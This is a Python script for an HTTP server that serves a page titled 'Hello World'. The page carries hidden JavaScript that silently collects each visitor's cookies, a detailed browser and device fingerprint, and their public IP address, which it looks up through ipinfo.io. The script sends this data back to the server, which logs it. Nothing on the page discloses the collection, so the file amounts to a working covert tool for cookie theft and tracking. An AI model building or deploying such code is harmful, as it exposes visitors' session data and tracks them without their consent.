import http.server
import socketserver
import urllib.parse as urlparse
import json
import sys
import threading

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080

# HTML content with JavaScript injected
html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World</title>
    <script>
        function collectAndSendData(ipAddress) {
            var userAgent = navigator.userAgent;
            var browserWidth = window.innerWidth || window.screen.width;
            var browserHeight = window.innerHeight || window.screen.height;
            var screenResBrowser = browserWidth + "x" + browserHeight;
            var monitorWidth = window.screen.width;
            var monitorHeight = window.screen.height;
            var screenResMonitor = monitorWidth + "x" + monitorHeight;
            var cookies = document.cookie;
            var osVersion = navigator.userAgent;
            var plugins = [];
            if (navigator.plugins) {
                for (var i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }
            }
            var platform = navigator.platform;
            var language = navigator.language || navigator.userLanguage;
            var timezoneOffset = new Date().getTimezoneOffset();
            var hardwareConcurrency = navigator.hardwareConcurrency || "unknown";
            var deviceMemory = navigator.deviceMemory || "unknown";
            var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            var connectionType = connection ? connection.effectiveType : "unknown";
            var maxTouchPoints = navigator.maxTouchPoints || "unknown";
            var isRetina = window.devicePixelRatio > 1;
            var hasTouchBar = screenResMonitor === "2170x60";
            var hasApplePay = window.ApplePaySession && ApplePaySession.canMakePayments();
            var isTrackpad = 'ontouchstart' in window;

            var newUrl = "/Results/efil/" + 
                "?user_agent=" + encodeURIComponent(userAgent) +
                "&screen_res_browser=" + encodeURIComponent(screenResBrowser) +
                "&screen_res_monitor=" + encodeURIComponent(screenResMonitor) +
                "&cookies=" + encodeURIComponent(cookies) +
                "&os_version=" + encodeURIComponent(osVersion) +
                "&battery_status=not_supported" +
                "&plugins=" + encodeURIComponent(JSON.stringify(plugins)) +
                "&platform=" + encodeURIComponent(platform) +
                "&language=" + encodeURIComponent(language) +
                "&timezone_offset=" + encodeURIComponent(timezoneOffset) +
                "&hardware_concurrency=" + encodeURIComponent(hardwareConcurrency) +
                "&device_memory=" + encodeURIComponent(deviceMemory) +
                "&connection_type=" + encodeURIComponent(connectionType) +
                "&max_touch_points=" + encodeURIComponent(maxTouchPoints) +
                "&is_retina=" + encodeURIComponent(isRetina) +
                "&has_touch_bar=" + encodeURIComponent(hasTouchBar) +
                "&has_apple_pay=" + encodeURIComponent(hasApplePay) +
                "&is_trackpad=" + encodeURIComponent(isTrackpad) +
                "&ip_address_fromipinfo=" + encodeURIComponent(ipAddress);

            var img = new Image();
            img.src = newUrl;
        }

        function getIpAndCollectData() {
            fetch('https://ipinfo.io/ip')
                .then(response => response.text())
                .then(ipAddress => {
                    setTimeout(() => collectAndSendData(ipAddress.trim()), 2000);
                })
                .catch(() => {
                    setTimeout(() => collectAndSendData('unknown'), 2000);
                });
        }

        getIpAndCollectData();
    </script>
</head>
<body>
    <h1>Hello World</h1>
</body>
</html>
"""

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(html_content.encode('utf-8'))
        elif self.path.startswith("/Results/efil/"):
            parsed_path = urlparse.urlparse(self.path)
            query_components = urlparse.parse_qs(parsed_path.query)

            # Convert query parameters to JSON
            json_data = json.dumps({k: v[0] for k, v in query_components.items()}, indent=4)

            # Print the JSON data to console
            print("\n--- Data Collected ---")
            print(json_data)
            print("----------------------\n")

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json_data.encode('utf-8'))
        else:
            super().do_GET()

def run_server():
    with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
        print(f"Serving on port {PORT}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass
        finally:
            httpd.server_close()
            print("Server stopped and socket closed.")

if __name__ == "__main__":
    server_thread = threading.Thread(target=run_server)
    server_thread.start()
    try:
        server_thread.join()
    except KeyboardInterrupt:
        print("Keyboard interrupt received, shutting down the server.")
